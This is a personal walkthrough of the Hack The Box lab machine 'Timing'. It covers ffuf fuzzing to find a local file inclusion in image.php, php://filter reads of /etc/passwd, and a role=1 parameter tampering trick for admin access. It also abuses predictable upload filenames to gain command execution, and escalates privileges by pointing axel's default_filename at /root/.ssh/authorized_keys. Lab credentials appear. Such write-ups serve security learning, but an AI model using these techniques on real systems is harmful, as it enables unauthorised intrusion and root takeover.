# Timing

Difficulty: 5
Key takeway: Try to access the uploaded files using LFI to get shells, and if you canâ€™t get a shell try navigating the file system to download any interesting files using LFI 
Tags: .git, LFI, SSH, file upload, password reuse, pspy
Type: Linux

# Enumeration

portscan 

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d2:5c:40:d7:c9:fe:ff:a8:83:c3:6e:cd:60:11:d2:eb (RSA)
|   256 18:c9:f7:b9:27:36:a1:16:59:23:35:84:34:31:b3:ad (ECDSA)
|_  256 a2:2d:ee:db:4e:bf:f9:3f:8b:d4:cf:b4:12:d8:20:f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Simple WebApp
|_Requested resource was ./login.php
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- image.php returns 200 OK status code but displays a blank page, it is possible it is executing the php code inside image.php
- Found **img** paramter

```bash
[ kali@kali ]-[ ~/htb/timing ] $ ffuf -u "http://timing.htb/image.php?FUZZ=/etc/passwd" -w /usr/share/wordlists/wfuzz/general/common.txt -fw 1

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://timing.htb/image.php?FUZZ=/etc/passwd
 :: Wordlist         : FUZZ: /usr/share/wordlists/wfuzz/general/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response words: 1
________________________________________________

img                     [Status: 200, Size: 25, Words: 3, Lines: 1]
```

![Untitled](Untitled.png)

- Trying to access the file with php://filter/base64.convert-encode/resource=/etc/passwd
- Log file poisoning is not possible
- login.php

```php
if (isset($_GET['login'])) {                                                                                                                                                                                                                  
    $username = $_POST['user'];                                                                                                                                                                                                               
    $password = $_POST['password'];                                                                                                                                                                                                           
                                                                                                                                                                                                                                              
    $statement = $pdo->prepare("SELECT * FROM users WHERE username = :username");                                                                                                                                                             
    $result = $statement->execute(array('username' => $username));                                                                                                                                                                            
    $user = $statement->fetch();                                                                                                                                                                                                              
                                                                                                                                                                                                                                              
    if ($user !== false) {                                                                                                                                                                                                                    
        createTimeChannel();                                                                                                                                                                                                                  
        if (password_verify($password, $user['password'])) {                                                                                                                                                                                  
            $_SESSION['userid'] = $user['id'];                                                                                                                                                                                                
            $_SESSION['role'] = $user['role'];                                                                                                                                                                                                
            header('Location: ./index.php');                                                                                                                                                                                                  
            return;                                                                                                                                                                                                                           
        }                                                                                                                                                                                                                                     
    }                                                                                                                                                                                                                                         
    $errorMessage = "Invalid username or password entered";                                                                                                                                                                                   
                                                                                                                                                                                                                                              
                                                                                                                                                                                                                                              
}
```

- db_conn.php

```php
<?php
$pdo = new PDO('mysql:host=localhost;dbname=app', 'root', '4_V3Ry_l0000n9_p422w0rd');
```

- upload.php

```php
<?php
include("admin_auth_check.php");

$upload_dir = "images/uploads/";

if (!file_exists($upload_dir)) {
    mkdir($upload_dir, 0777, true);
}

$file_hash = uniqid();

$file_name = md5('$file_hash' . time()) . '_' . basename($_FILES["fileToUpload"]["name"]);
$target_file = $upload_dir . $file_name;
$error = "";
$imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));

if (isset($_POST["submit"])) {
    $check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);
    if ($check === false) {
        $error = "Invalid file";
    }
}

// Check if file already exists
if (file_exists($target_file)) {
    $error = "Sorry, file already exists.";
}

if ($imageFileType != "jpg") {
    $error = "This extension is not allowed.";
}

if (empty($error)) {
    if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
        echo "The file has been uploaded.";
    } else {
        echo "Error: There was an error uploading your file.";
    }
} else {
    echo "Error: " . $error;
}
?>
```

- admin_auth_check.php

```php
<?php

include_once "auth_check.php";

if (!isset($_SESSION['role']) || $_SESSION['role'] != 1) {
    echo "No permission to access this panel!";
    header('Location: ./index.php');
    die();
}

?>
```

- auth_check.php

```php
<?php

//ini_set('display_errors', '1');
//ini_set('display_startup_errors', '1');
//error_reporting(E_ALL);

// session is valid for 1 hour
ini_set('session.gc_maxlifetime', 3600);
session_set_cookie_params(3600);

session_start();
if (!isset($_SESSION['userid']) && strpos($_SERVER['REQUEST_URI'], "login.php") === false) {
    header('Location: ./login.php');
    die();
}
?>
```

- Found a reference to a file 'avatar_uploader.php' inside header.php, it can only be accessed by admins (role = 1)
- used "aaron:aaron" to login, grabbed the username from /etc/passwd
- to get admin privileges on the dashboard, update your profile and add an additional parameter role=1 (for admin)

```php
.
.
firstName=test&lastName=test&company=test&email=email@email.com&role=1
```

- going back to home, "Admin Panel" is now unlocked to access avatar_uploader.php
- in `upload.php` $file_hash is surrounded by quotes so the actual hash is not being used, play around with the time function to get command injection

# Initial Access

- upload the file using burpsuite and check for it's upload time in response header
- use timestamp to EPOCH converter to convert into a timestamp
- use that timestamp to generate the name of the file
- use LFI to get command injection
- can't get reverse shell from this LFI, downloaded /opt/source-backup-files.zip
- has a .git directory, which when extracted with gitExtractor, gives a slightly different db_conn.php file with aaron's SSH creds

# Privilege Escalation

- sudo -l reveals we are allowed to run /usr/bin/netutils as root
- netutils runs axel which redirects the output of the downloaded file to a certain file, with permissions -rw-r-r- which is similar to id_rsa.pub file.
- Create an .axelrc in /home/aaron with contents

```php
default_filename = /root/.ssh/authorized_keys
```

- So I create my own id_rsa.pub file store it as index.html, host a python web server on my machine and access it via /usr/bin/netutils on the target machine.
- Now we can login to the root SSH using the id_rsa we had created earlier

## Notes

-